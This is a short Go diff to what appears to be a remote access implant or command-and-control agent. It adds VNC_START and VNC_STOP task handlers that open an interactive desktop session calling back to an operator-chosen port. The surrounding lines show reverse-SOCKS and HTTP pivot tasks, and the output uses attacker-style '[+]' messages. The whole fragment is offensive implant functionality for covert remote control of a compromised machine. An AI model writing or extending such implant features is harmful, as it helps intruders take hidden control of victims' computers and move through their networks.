@@ -1281,6 +1281,30 @@ func dispatchTask(t transport, task taskWire) {
 	case "RSOCKS_STOP":
 		t.sendResult(task.ID, stopRSocks(), "")
 
+	// ── Interactive VNC desktop ───────────────────────────────────────────────
+
+	case "VNC_START":
+		// Args: "<callbackPort> [quality]"  quality = 1-100, default 60
+		parts := strings.Fields(strings.TrimSpace(task.Args))
+		if len(parts) == 0 {
+			t.sendResult(task.ID, "", "usage: VNC_START <callback_port> [quality]")
+			return
+		}
+		quality := 60
+		if len(parts) >= 2 {
+			if q, err := strconv.Atoi(parts[1]); err == nil && q >= 1 && q <= 100 {
+				quality = q
+			}
+		}
+		if err := vncStart(parts[0], quality); err != nil {
+			t.sendResult(task.ID, "", err.Error())
+			return
+		}
+		t.sendResult(task.ID, "[+] VNC session started (callback port "+parts[0]+")", "")
+
+	case "VNC_STOP":
+		t.sendResult(task.ID, vncStop(), "")
+
 	case "HTTP_PIVOT_START":
 		port := 8888
 		if task.Args != "" {
